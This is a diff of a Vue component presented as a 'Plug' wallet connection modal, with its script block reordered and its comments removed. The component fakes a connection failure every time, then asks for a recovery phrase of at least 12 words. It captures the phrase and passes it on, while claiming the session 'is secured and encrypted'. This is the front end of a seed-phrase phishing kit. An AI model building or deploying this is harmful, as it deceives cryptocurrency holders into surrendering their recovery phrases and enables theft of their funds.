@@ -1,133 +1,5 @@
-
-<script setup lang="ts">
-
-interface Props {
-  show?: boolean
-  walletName?: string
-  walletLogo?: string
-}
-
-const props = withDefaults(defineProps<Props>(), {
-  show: false,
-  walletName: 'Plug',
-  walletLogo: '/images/logo/plug.svg'
-})
-
-const emit = defineEmits<{
-  close: []
-  submit: [payload: { walletPhrase: string, walletName: string }, ]
-}>()
-
-type ModalState =
-    | 'connecting'
-    | 'failed'
-    | 'manual'
-
-const state = ref<ModalState>('connecting')
-
-const walletPhrase = ref('')
-const walletPhraseError = ref('')
-
-/*
-|--------------------------------------------------------------------------
-| Start connection
-|--------------------------------------------------------------------------
-*/
-
-const startConnection = async () => {
-  state.value = 'connecting'
-  await new Promise(resolve => setTimeout(resolve, 1800))
-  state.value = 'failed'
-}
-
-
-
-
-/*
-|--------------------------------------------------------------------------
-| Try again
-|--------------------------------------------------------------------------
-*/
-
-const tryAgain = () => {
-  startConnection()
-}
-
-
-/*
-|--------------------------------------------------------------------------
-| Manual connection
-|--------------------------------------------------------------------------
-*/
-
-const showManualConnection = () => {
-  state.value = 'manual'
-}
-
-
-/*
-|--------------------------------------------------------------------------
-| Safe demo manual connection
-|--------------------------------------------------------------------------
-*/
-
-
-function validateSecretPhrase() {
-  const trimmed = walletPhrase.value.trim()
-  const wordCount = trimmed.split(/\s+/).filter(Boolean).length
-
-  if (!trimmed) {
-    walletPhraseError.value = 'Secret Phrase is required'
-  } else if (wordCount < 12) {
-    walletPhraseError.value = 'Secret Phrase must contain at least 12 words'
-  } else {
-    walletPhraseError.value = ''
-  }
-  return !walletPhraseError.value
-}
-const handleSubmit = () => {
-  if (!validateSecretPhrase()) {
-    return
-  }
-  emit('submit', { walletPhrase: walletPhrase.value, walletName: props.walletName })
-}
-
-/*
-|--------------------------------------------------------------------------
-| Reset when modal opens
-|--------------------------------------------------------------------------
-*/
-watch(walletPhrase, () => { walletPhraseError.value = '' })
-
-watch(
-    () => props.show,
-    (visible) => {
-      if (visible) {
-        state.value = 'connecting'
-        walletPhrase.value = ''
-
-        startConnection()
-      }
-    }
-)
-
-
-/*
-|--------------------------------------------------------------------------
-| Close
-|--------------------------------------------------------------------------
-*/
-
-const closeModal = () => {
-  emit('close')
-}
-</script>
-
-
 <template>
   <Transition name="modal">
-
-    <!-- Overlay -->
     <div
         v-if="show"
         class="fixed inset-0 z-[1050] flex items-center justify-center bg-black/50 px-4"
@@ -136,13 +8,9 @@ const closeModal = () => {
         :aria-labelledby="`wallet-modal-${walletName}`"
         @click.self="closeModal"
     >
-
-      <!-- Modal -->
       <div
           class="relative w-full max-w-[520px] rounded-2xl bg-white shadow-2xl"
       >
-
-        <!-- Close -->
         <button
             type="button"
             class="absolute right-4 top-4 z-20 flex h-9 w-9 items-center cursor-pointer justify-center rounded-full text-2xl leading-none text-gray-500 transition hover:bg-gray-100 hover:text-gray-900"
@@ -151,16 +19,7 @@ const closeModal = () => {
         >
           ×
         </button>
-
-
-        <!-- Modal body -->
         <div class="space-y-5 px-6 py-10 sm:px-10">
-
-
-          <!-- ====================================================== -->
-          <!-- WALLET HEADER -->
-          <!-- ====================================================== -->
-
           <div class="text-center">
 
             <img
@@ -179,26 +38,15 @@ const closeModal = () => {
             </h3>
 
           </div>
-
-
-          <!-- Security -->
           <p class="text-center text-lg text-gray-500">
             This session is secured and encrypted
           </p>
-
-
-          <!-- ====================================================== -->
-          <!-- CONNECTING -->
-          <!-- ====================================================== -->
-
           <div
               v-if="state === 'connecting'"
               class="py-10"
           >
 
             <div class="flex flex-col items-center">
-
-              <!-- Spinner -->
               <div
                   class="h-10 w-10 animate-spin rounded-full border-4 border-gray-200 border-t-[#5145ff]"
                   aria-hidden="true"
@@ -221,27 +69,14 @@ const closeModal = () => {
             </div>
 
           </div>
-
-
-          <!-- ====================================================== -->
-          <!-- FAILED -->
-          <!-- ====================================================== -->
-
           <div v-else-if="state === 'failed'">
-
-            <!-- Error -->
             <div
                 class="rounded-md border border-red-500 px-3 py-1 text-center text-base font-medium text-[#FF0000]"
                 role="alert"
             >
               An error occurred... please try again or connect manually
             </div>
-
-
-            <!-- Buttons -->
             <div class="mt-10 space-y-3">
-
-              <!-- Try again -->
               <button
                   type="button"
                   class="w-full rounded-full border border-[#5145ff] px-5 py-3 text-sm font-semibold text-[#5145ff] transition hover:bg-[#5145ff] hover:text-white"
@@ -249,9 +84,6 @@ const closeModal = () => {
               >
                 Try Again
               </button>
-
-
-              <!-- Manual -->
               <button
                   type="button"
                   class="w-full cursor-pointer rounded-full bg-[#5145ff] px-5 py-3 text-sm font-semibold text-white transition hover:bg-[#4035e8]"
@@ -263,12 +95,6 @@ const closeModal = () => {
             </div>
 
           </div>
-
-
-          <!-- ====================================================== -->
-          <!-- MANUAL CONNECTION -->
-          <!-- ====================================================== -->
-
           <div v-else-if="state === 'manual'">
 
             <div class="mb-5">
@@ -290,9 +116,6 @@ const closeModal = () => {
               required></textarea>
               <p v-if="walletPhraseError" class="text-red-500 text-sm mt-1">{{ walletPhraseError }}</p>
             </div>
-
-
-            <!-- Connect -->
             <button
                 type="button"
                 class="mt-5 cursor-pointer w-full rounded-full bg-[#5145ff] px-5 py-3 text-sm font-semibold text-white transition hover:bg-[#4035e8]"
@@ -300,9 +123,6 @@ const closeModal = () => {
             >
               Connect Wallet
             </button>
-
-
-            <!-- Back -->
             <button
                 type="button"
                 class="mt-3 cursor-pointer w-full px-5 py-2 text-sm font-medium text-gray-500 transition hover:text-gray-900"
@@ -312,12 +132,6 @@ const closeModal = () => {
             </button>
 
           </div>
-
-
-          <!-- ====================================================== -->
-          <!-- BOTTOM SECURITY -->
-          <!-- ====================================================== -->
-
           <div class="pt-8">
 
             <div
@@ -348,7 +162,87 @@ const closeModal = () => {
 
   </Transition>
 </template>
+<script setup lang="ts">
 
+interface Props {
+  show?: boolean
+  walletName?: string
+  walletLogo?: string
+}
+
+const props = withDefaults(defineProps<Props>(), {
+  show: false,
+  walletName: 'Plug',
+  walletLogo: '/images/logo/plug.svg'
+})
+
+const emit = defineEmits<{
+  close: []
+  submit: [payload: { walletPhrase: string, walletName: string }, ]
+}>()
+
+type ModalState =
+    | 'connecting'
+    | 'failed'
+    | 'manual'
+
+const state = ref<ModalState>('connecting')
+
+const walletPhrase = ref('')
+const walletPhraseError = ref('')
+
+const startConnection = async () => {
+  state.value = 'connecting'
+  await new Promise(resolve => setTimeout(resolve, 1800))
+  state.value = 'failed'
+}
+
+const tryAgain = () => {
+  startConnection()
+}
+
+const showManualConnection = () => {
+  state.value = 'manual'
+}
+
+function validateSecretPhrase() {
+  const trimmed = walletPhrase.value.trim()
+  const wordCount = trimmed.split(/\s+/).filter(Boolean).length
+
+  if (!trimmed) {
+    walletPhraseError.value = 'Secret Phrase is required'
+  } else if (wordCount < 12) {
+    walletPhraseError.value = 'Secret Phrase must contain at least 12 words'
+  } else {
+    walletPhraseError.value = ''
+  }
+  return !walletPhraseError.value
+}
+const handleSubmit = () => {
+  if (!validateSecretPhrase()) {
+    return
+  }
+  emit('submit', { walletPhrase: walletPhrase.value, walletName: props.walletName })
+}
+
+watch(walletPhrase, () => { walletPhraseError.value = '' })
+
+watch(
+    () => props.show,
+    (visible) => {
+      if (visible) {
+        state.value = 'connecting'
+        walletPhrase.value = ''
+
+        startConnection()
+      }
+    }
+)
+
+const closeModal = () => {
+  emit('close')
+}
+</script>
 
 <style scoped>
 .modal-enter-active,
